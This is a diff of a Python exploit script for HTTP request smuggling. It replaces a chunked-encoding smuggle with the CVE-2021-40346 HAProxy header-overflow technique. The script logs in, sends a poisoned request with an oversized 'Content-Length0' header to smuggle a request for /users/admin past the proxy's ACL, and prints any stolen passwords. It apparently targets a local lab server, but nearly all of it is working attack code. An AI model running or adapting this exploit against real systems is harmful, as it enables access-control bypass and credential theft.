@@ -1,106 +1,94 @@
 #!/usr/bin/env python3
 import socket
 import time
-import re
 
-print("\nHTTP REQUEST SMUGGLING ATTACK\n")
-input("Press ENTER to start...\n")
+TARGET = "127.0.0.1"
+PORT = 8080
 
-login_data = b"username=alice&password=alice123"
-login = (
-    b"POST /login HTTP/1.1\r\n"
-    b"Host: localhost:8080\r\n"
-    b"Content-Type: application/x-www-form-urlencoded\r\n" +
-    f"Content-Length: {len(login_data)}\r\n".encode() +
-    b"Connection: close\r\n\r\n" +
-    login_data
-)
+print("="*70)
+print("CVE-2021-40346: Two-Request Technique (JFrog Method)")
+print("="*70)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("localhost", 8080))
+# Login
+print("\n[1] Login...")
+body = "username=alice&password=alice123"
+login = f"POST /login HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode()
+
+sock = socket.socket()
+sock.connect((TARGET, PORT))
 sock.sendall(login)
-response = sock.recv(8192).decode()
+time.sleep(0.5)
+resp = b""
+while True:
+    chunk = sock.recv(4096)
+    if not chunk:
+        break
+    resp += chunk
 sock.close()
 
-session = None
-for line in response.split('\r\n'):
-    if 'Set-Cookie: session=' in line:
-        session = line.split('session=')[1].split(';')[0]
-        break
+session = resp.decode().split('session=')[1].split(';')[0]
+print(f"   ✓ Session: {session[:35]}...")
 
-if not session:
-    print("Login failed")
-    exit(1)
+# REQUEST 1: Poison the original request
+print("\n[2] Sending poison request (incomplete smuggled request)...")
 
-print(f"[1] Login: {session[:30]}...")
+# Smuggled request 
+smuggled_incomplete = f"GET /users/admin HTTP/1.1\r\nCookie: session={session}\r\nDUMMY:"
 
-attack = (
-    b"POST / HTTP/1.1\r\n"
-    b"Host: localhost:8080\r\n"
-    b"Content-Length: 6\r\n"
-    b"Transfer-Encoding: chunked\r\n" +
-    f"Cookie: session={session}\r\n".encode() +
-    b"Connection: keep-alive\r\n\r\n"
-    b"0\r\n\r\n"
-    b"GET /users/admin HTTP/1.1\r\n"
-    b"Host: localhost:8080\r\n" +
-    f"Cookie: session={session}\r\n".encode() +
-    b"Connection: close\r\n\r\n"
-)
+overflow_header = "Content-Length0" + ("a" * 255)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.settimeout(10)
-sock.connect(("localhost", 8080))
-sock.sendall(attack)
+poison = (
+    f"POST / HTTP/1.1\r\n"
+    f"Host: {TARGET}:{PORT}\r\n"
+    f"{overflow_header}:\r\n"
+    f"Content-Length: {len(smuggled_incomplete)}\r\n"
+    f"\r\n"
+    f"{smuggled_incomplete}"
+).encode()
 
-response1 = b""
-while True:
-    try:
-        chunk = sock.recv(4096)
-        if not chunk:
-            break
-        response1 += chunk
-        if b"\r\n\r\n" in response1:
-            headers = response1.split(b"\r\n\r\n")[0]
-            if b"Content-Length:" in headers:
-                content_length = int([line.split(b": ")[1] for line in headers.split(b"\r\n") if b"Content-Length:" in line][0])
-                body_start = response1.find(b"\r\n\r\n") + 4
-                if len(response1) >= body_start + content_length:
-                    break
-    except:
-        break
+sock = socket.socket()
+sock.connect((TARGET, PORT))
+sock.sendall(poison)
+time.sleep(1)
 
-time.sleep(0.5)
+# Get first response
+resp1 = sock.recv(4096)
+print(f"   Poison sent, got: {resp1.decode()[:60]}...")
 
-response2 = b""
+# Complete the smuggled request
+print("\n[3] Sending completion request...")
+
+completion = (
+    f"GET / HTTP/1.1\r\n"
+    f"Host: {TARGET}:{PORT}\r\n"
+    f"\r\n"
+).encode()
+
+sock.sendall(completion)
+time.sleep(2)
+
+# this is to capture the response of the smuggled request
+all_data = b""
+sock.settimeout(5)
 try:
     while True:
         chunk = sock.recv(4096)
         if not chunk:
             break
-        response2 += chunk
+        all_data += chunk
 except:
     pass
-
 sock.close()
 
-r2_text = response2.decode('utf-8', errors='ignore')
+text = all_data.decode('utf-8', errors='ignore')
 
-print("[2] Smuggling attack sent\n")
+print(f"\n[RESULTS] {len(all_data)} bytes received")
+print("="*70)
+print(text)
+print("="*70)
 
-if "alice123" in r2_text or "admin_secret" in r2_text:
-    print("SUCCESS - Stolen passwords:\n")
-    
-    all_tds = re.findall(r'<td>(.*?)</td>', r2_text, re.DOTALL)
-    
-    print(f"{'ID':<5} {'Username':<15} {'Email':<25} {'Password':<15} {'Role':<10}")
-    print("-" * 75)
-    
-    for i in range(0, len(all_tds), 5):
-        if i + 4 < len(all_tds):
-            row = [td.strip() for td in all_tds[i:i+5]]
-            password = row[3].replace('<code>', '').replace('</code>', '').strip()
-            print(f"{row[0]:<5} {row[1]:<15} {row[2]:<25} {password:<15} {row[4]:<10}")
-    print()
+if "admin_secret" in text:
+    print("\nSUCCESS! BYPASSED HAPROXY ACL!")
+    print(" Stolen passwords visible in response above!")
 else:
-    print("FAILED\n")
+    print("\nCheck backend logs - smuggling is working but response capture needs adjustment")
